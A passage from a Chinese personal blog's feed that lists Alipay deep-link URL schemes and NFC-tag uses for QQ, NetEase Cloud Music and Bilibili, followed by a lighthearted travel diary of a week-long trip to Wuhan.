class="line">alipays://platformapi/startapp?appId=66666683</span><br><span class="line">信用借还:</span><br><span class="line">alipays://platformapi/startapp?appId=66666684</span><br><span class="line">网银大额充值:</span><br><span class="line">alipays://platformapi/startapp?appId=66666685</span><br><span class="line">泛行业频道:</span><br><span class="line">alipays://platformapi/startapp?appId=66666686</span><br><span class="line">jet离线加速一:</span><br><span class="line">alipays://platformapi/startapp?appId=66666687</span><br><span class="line">我的发票抬头:</span><br><span class="line">alipays://platformapi/startapp?appId=66666688</span><br><span class="line">附近人气榜:</span><br><span class="line">alipays://platformapi/startapp?appId=66666689</span><br><span class="line">店铺弹窗领券:</span><br><span class="line">alipays://platformapi/startapp?appId=66666691</span><br><span class="line">小程序资源包:</span><br><span class="line">alipays://platformapi/startapp?appId=66666692</span><br><span class="line">标签系统:</span><br><span class="line">alipays://platformapi/startapp?appId=66666698</span><br><span class="line">境外当面付店铺码:</span><br><span class="line">alipays://platformapi/startapp?appId=66666699</span><br><span class="line">实物黄金:</span><br><span class="line">alipays://platformapi/startapp?appId=66666700</span><br><span class="line">appraise:</span><br><span class="line">alipays://platformapi/startapp?appId=66666702</span><br><span class="line">打开支付宝:</span><br><span class="line">alipays://platformapi/startapp?appId=66666706</span><br><span class="line">mallcoupon:</span><br><span class="line">alipays://platformapi/startapp?appId=66666707</span><br><span class="line">商圈聚合页:</span><br><span class="line">alipays://platformapi/startapp?appId=66666710</span><br><span class="line">天猫资源加速:</span><br><span class="line">alipays://platformapi/startapp?appId=66666711</span><br><span class="line">芝麻信用:</span><br><span class="line">alipays://platformapi/startapp?appId=66666713</span><br><span class="line">信用卡还款H5:</span><br><span class="line">alipays://platformapi/startapp?appId=66666715</span><br><span class="line">小程序关于页面:</span><br><span class="line">alipays://platformapi/startapp?appId=66666718</span><br><span class="line">功能管理:</span><br><span class="line">alipays://platformapi/startapp?appId=66666719</span><br><span class="line">钱包股票-社区资讯:</span><br><span class="line">alipays://platformapi/startapp?appId=66666721</span><br><span class="line">钱包股票-行情和提醒:</span><br><span class="line">alipays://platformapi/startapp?appId=66666722</span><br><span class="line">统一授权管理:</span><br><span class="line">alipays://platformapi/startapp?appId=66666724</span><br><span class="line">区块链:</span><br><span class="line">alipays://platformapi/startapp?appId=66666728</span><br><span class="line">口碑红人:</span><br><span class="line">alipays://platformapi/startapp?appId=66666729</span><br><span class="line">花呗挖哦:</span><br><span class="line">alipays://platformapi/startapp?appId=66666733</span><br><span class="line">基金组合：</span><br><span class="line">alipays://platformapi/startapp?appId=66666735</span><br><span class="line">财富社区：</span><br><span class="line">alipays://platformapi/startapp?appId=66666741</span><br><span class="line">口碑平台弹层：</span><br><span class="line">alipays://platformapi/startapp?appId=66666742</span><br><span class="line">定时转账提醒：</span><br><span class="line">alipays://platformapi/startapp?appId=66666743</span><br><span class="line">店铺详情页报错：</span><br><span class="line">alipays://platformapi/startapp?appId=66666749</span><br><span class="line">保险号：</span><br><span class="line">alipays://platformapi/startapp?appId=66666750</span><br><span class="line">商圈券包：</span><br><span class="line">alipays://platformapi/startapp?appId=66666754</span><br><span class="line">我的健康：</span><br><span class="line">alipays://platformapi/startapp?appId=66666755</span><br><span class="line">国际支付成功页：</span><br><span class="line">alipays://platformapi/startapp?appId=66666757</span><br><span class="line">流量钱包</span><br><span class="line">alipays://platformapi/startapp?appId=66666759</span><br><span class="line">消费捐：</span><br><span class="line">alipays://platformapi/startapp?appId=66666761</span><br><span class="line">车金融：</span><br><span class="line">alipays://platformapi/startapp?appId=66666762</span><br><span class="line">阿里智能：</span><br><span class="line">alipays://platformapi/startapp?appId=66666773</span><br><span class="line">商家说：</span><br><span class="line">alipays://platformapi/startapp?appId=66666774</span><br><span class="line">境外收款：</span><br><span class="line">alipays://platformapi/startapp?appId=66666777</span><br><span class="line">懒人一键理财：</span><br><span class="line">alipays://platformapi/startapp?appId=66666779</span><br><span class="line">支付宝刷脸付：</span><br><span class="line">alipays://platformapi/startapp?appId=66666781</span><br><span class="line">蚂蚁庄园星星球：</span><br><span class="line">alipays://platformapi/startapp?appId=66666782</span><br><span class="line">爱攒油加油站：</span><br><span class="line">alipays://platformapi/startapp?appId=66666783</span><br><span class="line">亲情圈：</span><br><span class="line">alipays://platformapi/startapp?appId=66666784</span><br><span class="line">飞猪酒店：</span><br><span class="line">alipays://platformapi/startapp?appId=66666787</span><br><span class="line">火车票正向主流程：</span><br><span class="line">alipays://platformapi/startapp?appId=66666788</span><br><span class="line">商家经营分析：</span><br><span class="line">alipays://platformapi/startapp?appId=66666791</span><br><span class="line">人传人转账拉新</span><br><span class="line">alipays://platformapi/startapp?appId=66666796</span><br><span class="line">飞猪国际机票WEEX：</span><br><span class="line">alipays://platformapi/startapp?appId=66666807</span><br><span class="line">芝麻认证小程序：</span><br><span class="line">alipays://platformapi/startapp?appId=66666808</span><br><span class="line">财富通用工具：</span><br><span class="line">alipays://platformapi/startapp?appId=66666810</span><br><span class="line">小钱袋：</span><br><span class="line">alipays://platformapi/startapp?appId=66666816</span><br><span class="line">Tinyjs资源：</span><br><span class="line">alipays://platformapi/startapp?appId=66666817</span><br><span class="line">财富标签页：</span><br><span class="line">alipays://platformapi/startapp?appId=66666825</span><br><span class="line">泛行业会场：</span><br><span class="line">alipays://platformapi/startapp?appId=66666827</span><br><span class="line">小富婆：</span><br><span class="line">alipays://platformapi/startapp?appId=66666829</span><br><span class="line">一字千金：</span><br><span class="line">alipays://platformapi/startapp?appId=66666831</span><br><span class="line">招牌来了：</span><br><span class="line">alipays://platformapi/startapp?appId=66666860</span><br><span class="line">直播频道：</span><br><span class="line">alipays://platformapi/startapp?appId=66666861</span><br><span class="line">口碑快消频道页：</span><br><span class="line">alipays://platformapi/startapp?appId=66666865</span><br><span class="line">智能设备：</span><br><span class="line">alipays://platformapi/startapp?appId=66666877</span><br><span class="line">淘票票H5资讯：</span><br><span class="line">alipays://platformapi/startapp?appId=66666881</span><br><span class="line">口碑资源加速包一：</span><br><span class="line">alipays://platformapi/startapp?appId=66666884</span><br><span class="line">国际机票交易：</span><br><span class="line">alipays://platformapi/startapp?appId=66666888</span><br><span class="line">工资理财：</span><br><span class="line">alipays://platformapi/startapp?appId=66666897</span><br><span class="line">银行卡：</span><br><span class="line">alipays://platformapi/startapp?appId=68686988</span><br><span class="line">2018五福首页：</span><br><span class="line">alipays://platformapi/startapp?appId=68687002</span><br><span class="line">2018新春集五福：</span><br><span class="line">alipays://platformapi/startapp?appId=68687028</span><br><span class="line">信用租承接：</span><br><span class="line">alipays://platformapi/startapp?appId=68687032</span><br><span class="line">appxNativeIOS框架包：</span><br><span class="line">alipays://platformapi/startapp?appId=68687035</span><br><span class="line">蚂蚁星愿：</span><br><span class="line">alipays://platformapi/startapp?appId=68687049</span><br><span class="line">Apple 专区：</span><br><span class="line">alipays://platformapi/startapp?appId=68687052</span><br><span class="line">养老金：</span><br><span class="line">alipays://platformapi/startapp?appId=68687131</span><br><span class="line">人脸、指纹、声纹：</span><br><span class="line">alipays://platformapi/startapp?appId=68687140</span><br><span class="line">安全设置：</span><br><span class="line">alipays://platformapi/startapp?appId=68687141</span><br><span class="line">支付宝授权：</span><br><span class="line">alipays://platformapi/startapp?appId=68687142</span><br><span class="line">股票发现-支付宝：</span><br><span class="line">alipays://platformapi/startapp?appId=68687145</span><br><span class="line">小程序收藏：</span><br><span class="line">alipays://platformapi/startapp?appId=68687164</span><br><span class="line">信用受理台：</span><br><span class="line">alipays://platformapi/startapp?appId=68687167</span><br><span class="line">星巴克用星说：</span><br><span class="line">alipays://platformapi/startapp?appId=77700096</span><br><span class="line">小程序分享二维码：</span><br><span class="line">alipays://platformapi/startapp?appId=77700109</span><br></pre></td></tr></table></figure><h3 id="碰一碰打开行程码-健康卡（已失效）"><a href="#碰一碰打开行程码-健康卡（已失效）" class="headerlink" title="碰一碰打开行程码&#x2F;健康卡（已失效）"></a>碰一碰打开行程码&#x2F;健康卡（已失效）</h3><p>这个原理也是通过打开支付宝的健康卡来使用的，我为什么要单独拿出来说一下呢？是因为之前闹瘟疫的时候，淘宝上出现一种东西：一键打开健康码</p><p><img src="http://cdn.lmark.cc/img/image-20230726111807556.png"></p><p>原理这么简单的一个操作，竟然能卖62块大洋，感觉老人的钱真好赚。岂可休，幸好现在瘟疫消失了，出门不用这些奇奇怪怪的码了。</p><h3 id="碰一碰打开-加入QQ群"><a href="#碰一碰打开-加入QQ群" class="headerlink" title="碰一碰打开&#x2F;加入QQ群"></a>碰一碰打开&#x2F;加入QQ群</h3><p>QQ一个比较好用的Scheme，适合拿来装B，碰一碰加入QQ群这个东西适合拿NTAG215然后贴在传单上，这样子就可以让别人碰一碰就加入群里，这不比扫码帅多了！Scheme如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mqq://card/show_pslcard?card_type=group&amp;uin=249923147</span><br></pre></td></tr></table></figure><p>当然也可以加好友，只要把card_type参数去掉即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mqq://card/show_pslcard?uin=2952569401</span><br></pre></td></tr></table></figure><p>具体使用效果可以参考我发在B站的视频：【碰一碰打开寄国-哔哩哔哩】 <a href="https://b23.tv/54TV5eY">https://b23.tv/54TV5eY</a></p><p><img src="http://cdn.lmark.cc/img/image-20230726123828182.png"></p><h3 id="碰一碰加入网易云一起听（仅供演示，无任何实际价值）"><a href="#碰一碰加入网易云一起听（仅供演示，无任何实际价值）" class="headerlink" title="碰一碰加入网易云一起听（仅供演示，无任何实际价值）"></a>碰一碰加入网易云一起听（仅供演示，无任何实际价值）</h3><p>之前偶然发现的，本来是挺浪漫的一个应用，随时随地，只要碰一碰就可以打开网易云一起听，使用如下Scheme：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orpheus://nm/play/listenTogether?roomId=0d6e3c9c5a8231a8bd313d535cb1a229_1690362958&amp;inviterId=412265742&amp;listenTogetherRefer=third_party_invite</span><br></pre></td></tr></table></figure><p>这个可以通过电脑浏览器调试找到</p><p><img src="http://cdn.lmark.cc/img/image-20230726172431290.png"></p><p>效果是挺好的，但是有个致命问题，就是每次一起听的房间号是实时生成的，所以一个邀请链接只有30分钟的保质期，过了30分钟保质期就过期了，所以并不能做到远程两个人碰一碰就一起听的效果。</p><p>理想的效果参考B站视频：【(全网首发)碰一碰就能和对象一起听歌？这不比音乐墙厉害多了？-哔哩哔哩】 <a href="https://b23.tv/7VYbjHd">https://b23.tv/7VYbjHd</a></p><h3 id="碰一碰打开B站视频-番剧（可以做番剧墙）"><a href="#碰一碰打开B站视频-番剧（可以做番剧墙）" class="headerlink" title="碰一碰打开B站视频&#x2F;番剧（可以做番剧墙）"></a>碰一碰打开B站视频&#x2F;番剧（可以做番剧墙）</h3><p>这个效果个人觉得还是不错的，适合拿来做番剧墙，或者碰一碰打开某个视频，方法也很简单，也是用电脑端的B站，然后抓包，比如，打开某部番：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bilibili://bangumi/season/1172</span><br></pre></td></tr></table></figure><p>再比如，打开某个视频：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bilibili://video/385492200</span><br></pre></td></tr></table></figure><p>B站还有很多Scheme可以用，有需要可以自己找，简易教程如下：</p><p><img src="http://cdn.lmark.cc/img/image-20230726174410515.png"></p><h3 id="碰一碰打开视频-音频（可以放相册里或者立体书）"><a href="#碰一碰打开视频-音频（可以放相册里或者立体书）" class="headerlink" title="碰一碰打开视频&#x2F;音频（可以放相册里或者立体书）"></a>碰一碰打开视频&#x2F;音频（可以放相册里或者立体书）</h3><p>这个功能挺美好的，但是要求视频和音频储存的地址比较持久化，不然以后就打不开了，同时，这个功能需要手机安装NFC Tasks这个独立的应用，写入效果如下：</p><p><img src="http://cdn.lmark.cc/img/image-20230726182753984.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>要是能调试好路径以及知道参数，用起来还是很方便的，不过其实大部分功能都是华而不实，所以还需要好好甄别。</p>]]></content>
      
      
      
        <tags>
            
            <tag> NFC </tag>
            
            <tag> Scheme </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>武汉游</title>
      
      <link href="/archives/83346b50.html"/>
      <url>/archives/83346b50.html</url>
      
        <content type="html"><![CDATA[<p>本来想着，在天河机场等飞机的时候就开始写的，结果躺椅子上直接睡着了，就忘了这事。回青岛之后忙着写作业，一直没机会写。现在终于忙完了，终于可以开始写了。</p><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>这是一篇游记，主要记录了五一假期去武汉七天的经历，没有文笔可言，主要是流水账和一些自己人的烂梗吧，不认识我的人估计看起来很费劲，不过我也会尽量写的通俗易懂的。写这篇游记的主要目的就是为了记录这7天在武汉发生的各种各样的魔幻的事情和经历。</p><h2 id="主要出场人物介绍"><a href="#主要出场人物介绍" class="headerlink" title="主要出场人物介绍"></a>主要出场人物介绍</h2><ul><li>我：笔者，亦是故事主人公，是一个心超大的人（或许），而且很笨（某个人说的）</li><li>同学Z：武带同学，人高还帅，就是不怎么出来玩。</li><li>同学L：民带同学，一个靓女，就是不怎么出来玩。</li><li>同学X：武理工的，一个好人，就是不怎么出来玩。</li></ul><h2 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h2><blockquote><p>如果再给你一次机会，你还会来武汉吗？</p><p>同学Z如是道</p></blockquote><p>这是同学Z当时某一天问我的一个问题，现在想想真是讽刺。谁能想到，一次正常的旅游，出了这么多鸟事。</p><p>本人是一名在琴岛念书的苦逼带学牲，这个学期解封之后，差不多把市区逛了个底朝天，然后在一次和同学L的闲聊之中，我开玩笑的说了一句，有时间可以去武汉玩（笑），</p><p><img src="https://cdn.lmark.cc/img/image-20230507235941131.png" title="起源"></p><p>然后，突然发现五一放五天假，这么一想，好像确实可以去。于是去武汉旅游这件事就<del>给我留下了心里阴影</del>在我心里扎了根。</p><p>3月和4月过去了，我的泰山之旅一直没去成，身边的同学也没人邀请我五一去玩（其实是有的，只不过不是很感兴趣，绝不是因为我没朋友） 。有个同学五一打算去淄博吃烧烤，但是我感觉淄博会很多人，遂没去（事实证明是正确的选择）。后面到了四月中旬，就正式决定了要去武汉了。</p><p>然后就是做攻略，买车票，订酒店。我这个人比较喜欢随性旅游，攻略就是在小红薯上看了两眼，就觉得稳了。事实证明，<strong>什么都看小红薯只会害了你！！！</strong>，然后有俩需要预约的地方（省博和美术馆）由于太佛系，结果忘了预约，然后就差点去不了了，不过这也是后话了。</p><p>攻略做好后（可能），接下来就是买去武汉的票了，这将是这趟魔幻旅程的开始。我现在很想穿越回当时买票的时候，然后给自己来几个大嘴巴子。我不知道当时怎么想的，<strong>从青岛到武汉的Z170绿皮火车，全程16小时17分，我TM买了硬座！硬座！！！</strong></p><p><img src="https://cdn.lmark.cc/img/image-20230508002540860.png" title="我是特种兵"></p><p>我当时想的是：</p><p><strong>这是什么？火车？没见过，坐一下硬座玩玩</strong>；这是什么？火车？没见过，坐一下硬座玩玩；这是什么？火车？没见过，坐一下硬座玩玩；这是什么？火车？没见过，坐一下硬座玩玩；这是什么？火车？没见过，坐一下硬座玩玩……</p><p>现在想想，还好回来的时候没买硬座，不然我直接死火车上，虽然回来时候出了亿点点意外。因为我周五下午只有一节通识课，我就直接翘了，去车站，拉着我的小小的未成年行李箱去赶火车了。</p><p><img src="https://cdn.lmark.cc/img/image-20230508015743532.png" title="注意看，眼前这个男人还在乐呵呵拍照，丝毫没有发现接下来十七个小时将会是何等的折磨"></p><p>进到车厢才发现，夷？怎么位置这么小；夷？怎么桌子这么小；夷？这座位怎么这么直。事情开始不对劲起来，我的位置是靠窗的，我进去的时候，人坐满了，我小心翼翼地来到我的位置，结果发现对面坐了个彪形大汉，他腿估计得有两三米吧，直接伸长长的，整得我只能曲着脚。一块不到两本书大的桌子，也被塞满了。就这样，怀揣着好奇和激动，火车出发了。。。。。。</p><p>前几个小时，车厢里到处充斥着快活的空气，有人跟身边的人激烈攀谈；有人在车厢过道蹲着打UNO；有人在吧唧吧唧地吃着薯片，有人站在堆积成山行李旁边羡慕看着硬座上的人。总之就是很激动。但是渐渐的，车厢安静了下来（当然，总有傻X抖音外放）。</p><p>大概三小时后，我开始感觉到不对劲了，怎么着硬座，越坐越累啊，赶紧趁着火车停靠，下车走一走，一直定定坐着几个小时，人都废了。</p><p><img src="https://cdn.lmark.cc/img/image-20230508015818040.png" title="中途停在不知道哪个站"></p><p>我本人比较社恐，没跟旁边的人聊天，虽然我旁边坐这个山东大姐姐。听她和旁边的聊天，得知她也是去武汉旅游的。然后，她旁边另一个男的（一排三个人），他是去看张杰演唱会的，也是个山东大哥，非常健谈。我们六个人中主要是这俩人在聊。在山东待久了，觉得<strong>山东人真的很不可思议，说话又好听，性格又好，一改我之前对捞佬的刻板印象。</strong></p><p>我就静静的玩手机，玩累了就玩switch，在火车上我还打了个火咒盖侬。时间很快到晚上，第一次坐火车，没准备啥吃的，下午吃了俩蛋黄酥，结果马上就饿了。然后乘务员来卖泡面，我很快啊，啪的一下，就买了桶面和水。这里要夸一下火车的物价了，农夫山泉买3块，泡面5块一桶，不坑穷人呀。属于可以接受的范围，热乎乎的盒饭也只要15-20元。</p><p>我吃完晚饭后，也快十点了，车厢里已经没啥闲聊了，只剩几个人在吹水，有几个人在批评一些社会现象，还有几个在聊一些不能碰的话题。总之，就是非常安静，此时，我的行程才刚过一半。到了十点，车厢熄了大灯，只剩下比较小的灯了，我也准备准备着，趴桌子上睡觉了。一张不到两本书大的桌子，趴了四个人在上面睡觉。</p><p><img src="https://cdn.lmark.cc/img/image-20230508015257575.png" title="不知名的停靠站"></p><p>没想到，那一晚，我睡了六七次觉。</p><p>火车的运作模式，很想公共汽车，换句话说，公共汽车是火车的弱化。每个站都可以买票上下，有无座票，还有很多人补票。再加上五一，导致绿皮承受了它这个年纪不该承受的客运量，哪哪都是人，而且每到一个站，就会有很多人上下，同时会框吃框吃的放行李，我经常是趴下去，过了四五十分钟，火车到站，哗哗下去一堆人，然后乒乒乓乓上来一堆人，挤来挤去，我就被吵醒了。还有很多人补票，乘务员就拿着大喇叭喊：谁要补票！谁要补票！然后一堆人冲到他面前补，结果后面人太多，乘务员直接摆烂不补了。还有一次醒过来是因为有个人行李找不到了，@乘务员找，乘务员为了看行李架，把一个睡着的人摇醒了，然后踩他位置（当然是垫了块布）上去拿行李。我看那个人也挺懵逼的。还有一次醒也很离谱，我睡得迷迷糊糊的，然后感觉有人在捶我，然后醒来一看发现，原来是我睡觉时压到旁边大姐姐的头发，她起身的时候估计被疼到了。这里我要说声红豆泥私密马赛。</p><p><img src="https://cdn.lmark.cc/img/image-20230508015322822.png" title="半夜一点多到郑州，四舍五入我去过郑州了，好！"></p><p>大概就是这样醒睡往复中，我开始思考火车为什么这么特别，明明我第一次坐火车，脑子里充满着汽笛轰鸣和飞轮雷动。为什么乘务员们穿着和绿皮火车一样的绿色，打扮像军人。后面我打开手机一看，才发现我一直忽视了什么，从<strong>青岛到武汉只要189</strong>。为什么绿皮这种这么慢的交通工具还没有被高铁淘汰，那是因为，这已经不单单是一辆火车了，而是一段活的历史，是承载着每个想要到达目的地的人的希冀的交通工具，纵然时代更迭，从烧煤变成了电动，但是它那一身浓浓的军绿色不断地提醒着我，这趟车一定能把每个人送到目的地，就像一位军人般坚毅。</p><p><img src="https://cdn.lmark.cc/img/image-20230508015423932.png" title="Z170绿皮的外观，还是很帅的"></p><p>第二天清晨，我醒来的时候，已经到了武汉了，看着窗外的老建筑一幢一幢的离我们远去，我知道我终于要到武汉了。虽然没体验过硬卧，没体验过餐车，没体验过厕所，这都不影响我我硬坐硬座十七个小时的壮（sha）举（bi）</p><h2 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h2><p>今天早上起床查了一下，Z开头的火车是什么意思，结果让人苦笑不得</p><p><img src="https://cdn.lmark.cc/img/image-20230508095637768.png" title="真直达嘛。。。"></p><p>我寻思着，也没有多快呀，而且也没有直达呀。不过这些都是小问题了。</p><p>总之就是到武昌站了，没有照片。</p><p>这个车站给我的第一印象是：<strong>乱和差</strong>，脏也有点，不过主要是乱和差，在车站里，各种指示牌不明显，特别是<strong>武汉轨道交通的LOGO，竟然是灰色的</strong>，和柱子融为一体，远远的完全看不到地铁站。去到地铁站之后更甚，没有什么指示，整体体验下来很差就是了。不过地铁站里面倒是很气派，浓厚的荆楚风格，厚实的立柱和吊顶。武汉的地铁也是很有意思的，车门比青岛的大很多，but门两边没有扶手，我当时站着的时候人都傻了。后面才发现，可能只是这一趟地铁没有，其他的大部分还是有。</p><p>坐地铁过程还是很无聊的。就我来武汉第一站是先去武汉理工大学找同学X，把我的行李放他宿舍里，然后再出去玩，下了地铁后，我选择乘公交车去武理工东门，没想到，武汉的公交能给我这么大的惊喜。地图上显示的路线需要开一个小时，在青岛，公交车的时间和地图上提示的时间是基本吻合的。没想到武汉公交这么猛，<strong>一个小时的车程直接给我干到三十分钟</strong>，虽然早就听说武汉公交是最牛的，没想到现在被新规制裁过之后还是这么牛。更多武汉公交的传说，详见：<a href="https://www.zhihu.com/question/24347637"> 如何证明武汉的公交车是最牛的？ - 知乎 (zhihu.com)</a>。我当时第一次坐，感受到司机不停的起步，刹车，起步，刹车。感觉电动车的起步快优势被司机玩明白了。</p><p>然后到了武汉理工大学附近之后，来的有点早，我就在学校门口过早，看了看菜单，热干面5块，襄阳牛肉面15块，然后果断点了份襄阳牛肉面（主要是不想吃这么干）味道怎么评价呢，很正常。这个面据说是咸水面，口感和广西的面有不小的差别，还是很好吃的。就是吃的过程中，感觉身边的人急匆匆的，有个人点了碗热干面就站着框框吃完了，还有人直接拿着边走边吃出门了。感觉这里每个人都是急急忙忙的，据说这是武汉的“码头文化”，在路上走也是，看到一个公交站台上四个女生在等车，三个蹲路面吃面。就很神奇，在其他地方完全看不到这种不矜持的场面吧，总之挺神奇的，武汉。</p><p><img src="https://cdn.lmark.cc/img/image-20230508105339910.png" title="襄阳牛肉面和免费的豆浆"></p><p>到了武理工门口后，同学X让我跟着别人混进学校，他们学校的保安直接摆大烂，只要跟着别人就可以随便进了。安保措施漏成了筛子。后面让同学X出来接我。快一年没见了，我站在他旁边，他甚至没有认出我（没爱了，悲）然后爬上他六楼宿舍（没有电梯！！！）去放行李，同学X因为要考试就不能和我出来玩了（正经人谁五一假期考试啊不会吧不会吧）。我和同学L&amp;同学Z碰头的时间是中午，现在还挺早的，就想着去黄鹤楼玩玩。然后就找了个公交站上车去黄鹤楼。</p><p><img src="https://cdn.lmark.cc/img/image-20230508115955239.png" alt="image-20230508115955239" title="这何尝不是一种牛头人"></p><p>没想到坐个公交也这么抽象，我一上车，就做了最前面那个很宽敞的母婴双人座，然后坐了几站陆续上来很多人，车上顿时没座了，然后我发现旁边站这个老奶奶，我看了一下，确认没人想让座之后，我就给她让了个座，老奶奶说很感谢小伙子。然而，下一站，哐哐下去一堆人，整个车厢瞬间没啥人了，我就很尴尬的跑到最后一排去坐了，感觉有点尴尬，就算我没让座，老奶奶下一站就可以随便坐了。算了，尴尬就尴尬吧。结果还有更尴尬的，到最后几站，车上没人了，就剩我一个坐后排，然后司机也许没注意到我，直接把公交停路边，然后开个前门下去抽烟玩手机了。我当时整个人都懵了，<strong>司机你是开公交的啊喂，怎么突然自顾自下车了喂！！！</strong>无奈，我只能跑到前门去把司机叫回来开车，司机看到我，估计也很懵：我车上什么时候多了个人？然后司机就跑回来开车了。</p><p>下公交后，还要腿一段路，我看着路边好多美团单车，想想刚才在武理工也看到很多共享单车。想着骑一骑试试，果断扫了一辆，刚骑一分钟，到了个路口，不让骑共享上去了，我直接问号。</p><p>如果你们和我一样，第一次骑共享单车就只有一分钟，那真是，泰裤辣！</p><p>到了黄鹤楼景区之后，发现整个景区还是很大的，很多各种仿古建筑，但是我都不感兴趣，普通仿古建筑到处都是，看多之后反倒无聊，所以我直奔黄鹤楼。我买的是学生票，只要35块大洋。很实惠了，为了值回票价，打算上黄鹤楼看看，可能是那天天气不好，加上时间比较早，人流量倒没有特别恐怖。就排了二十多分钟就进去了，现在的黄鹤楼是八几年时候建的，内部比较宽敞，而且还有电梯，如果你有七十岁，还可以直接坐电梯上去。在黄鹤楼上，确实会有种君临天下的感觉，而且每一层的风景还不一样，正可谓是：</p><p><strong>欲穷千里目，更上一层楼。</strong></p><p>上到最顶层，风超大，但是能看到的景色也不一样。</p><p><img src="https://cdn.lmark.cc/img/image-20230508122005064.png" alt="image-20230508122005064" title="远眺黄鹤楼"></p><p><img src="https://cdn.lmark.cc/img/image-20230508122117300.png" alt="image-20230508122117300" title="还好来得早，下面全是人"></p><p>我在黄鹤楼上眺望远处的时候，听到了一个熟悉的口音，是我们那边的方言，顿时感到很亲切，那一家子人感觉和我是老乡啥的，不过太尴尬我也没去问。可惜那天雾霾有点严重，视野不是很好，或者说相机拍不出来长焦的感觉</p><p><img src="https://cdn.lmark.cc/img/image-20230508122454356.png" alt="image-20230508122454356" title="江山入画，远处的是课本里出现过的武汉长江大桥"></p><p>在上面待了好一会，看够了之后我就下来了。下来之后看到有人吃那个黄鹤楼形状的雪糕，我想来都来了，我也尝一个吧顺便买两个纪念品。一看价格，15块，倒也能接受，不过后面吃了一口之后，才发现巨难吃，看来只适合拿来拍照。</p><p><img src="https://cdn.lmark.cc/img/image-20230508122853712.png" alt="image-20230508122853712" title="拔草了家人们，不好吃，真不好吃"></p><p>从黄鹤楼出来，大抵也10点多了，可以去武大和同学L&amp;同学Z碰面了，然后坐地铁去武大，结果路上同学L说要吃一点才能到，每次她说这个话，我大抵知道要等挺久的，所以顺路去了路上的<strong>宝通寺</strong>逛了逛。</p><p><img src="https://cdn.lmark.cc/img/image-20230508135554176.png" alt="image-20230508135554176" title="另一个角度的黄鹤楼"></p><p>对我来说，寺庙是一个休闲的好去处，因为我本人没有宗教信仰，宗教场所想去就去。而且，我比较喜欢佛教的寺庙，因为小时候住的地方，有人信佛教，所以受到过不小的熏陶。房子里萦绕着香香的味道，经轮（也许？）边转边播放着经文。每次去寺庙，感觉就像回到了小时候那会。而且寺庙是一个很神奇的地方，里面的时间近乎停滞。每个人都少了匆忙的感觉，进下心来感受这片土地的历史脉动。</p><p>我虽然没有宗教信仰，但是我相信一些别的东西，比如因果律。我进到法物流通处时，看到工作人员给游客讲还愿的事情，对呀，要是我在武汉祈愿，灵验之后还得跑回来还愿。想想就很麻烦，还是靠自己吧。<strong>自己的人生要自己活才精彩！</strong></p><p>然后继续往山上走，感觉好多寺庙后面都有一座山，山上都有一座塔，我就顺便上去看看。宝通寺的这个塔是始建于明朝的，在清朝重新修缮过，历经战乱和文革，现在依然屹立。这不比满大街的仿古建筑好看？然后下山的路上，路过一个亭子，发现一只猫猫和兔兔。两小只都很乖，能让路人RUA，我完全没有抵抗力，rua了好久的猫猫，然后发现同学L都快到武大了，我才急匆匆赶去武大。</p><p><img src="https://cdn.lmark.cc/img/image-20230509223947429.png" alt="image-20230509223947429" title="猫猫，我的猫猫，欸嘿嘿"></p><p>然后就到武大了，因为同学Z帮我预约了参观（好像是以家属的身份预约的）一口气就约了两天，我到了门口之后就直接刷身份证进去了。</p><p><img src="https://cdn.lmark.cc/img/image-20230509223154080.png" alt="image-20230509223154080" title="武大特色，游客随便进"></p><p>进去之后才发现，同学Z去接同学L了，因为同学L给我身份证太晚了，然后没帮她约上，所以就让同学Z偷偷给带进来。趁他们绕路的时候，我就在广场上玩了一下。武大还算是一个很热门的景点的，能进来看看是真不错。</p><p><img src="https://cdn.lmark.cc/img/image-20230509224042946.png" alt="image-20230509224042946" title="这何尝不是一种牛头人呢?"></p><p>逛了一圈，有点累了，毕竟已经坐了17小时硬座+走路6个小时，就想找个地坐，然后发现广场上没有可以坐的地，然后我就坐在一根柱子上。做了一会，看到同学Z&amp;同学L从远处走来，不过他们并没有看到我，我就发了个消息给他们我的方位，然后，，，大无语事件，他们看到我了，没认出我，一直在远处盯着我看T_T。他们两个人，四双眼睛都认不出我，只能说没爱了T_T。然后给他们来了一张。</p><p><img src="https://cdn.lmark.cc/img/image-20230509224848419.png" alt="image-20230509224848419" title="注意看，图里有两个人戴眼镜都认不出我，我不说是谁"></p><p>然后就会和了，发现同学L穿了马面裙和披了云肩，发饰非常好看。当时还是有点小震撼的。但是她之前在微信上说觉得太麻烦就不想穿这身（果然她的话不到最后15秒是不能信的）。三人小分队终于会和了，现在时间是下午一点半。</p><h2 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h2><p>三个人会和了，嗯，，，就，，，会和了，没有什么煽情的打招呼（虽然我和他俩有两年多没见了），当代年轻人怎么了都，太冷漠了，哎，这世道变了。然后我们提议让同学Z（武带人）带我们逛逛武汉大学，武汉大学还是很大的，<strong>毕竟是综合性大学</strong>。我们一路走一路聊聊近况啥的。感觉不像两年没见的朋友。路上还看到一张形状很艺术的椅子。不愧是综合性大学。</p><p><img src="https://cdn.lmark.cc/img/image-20230509235632619.png" alt="image-20230509235632619" 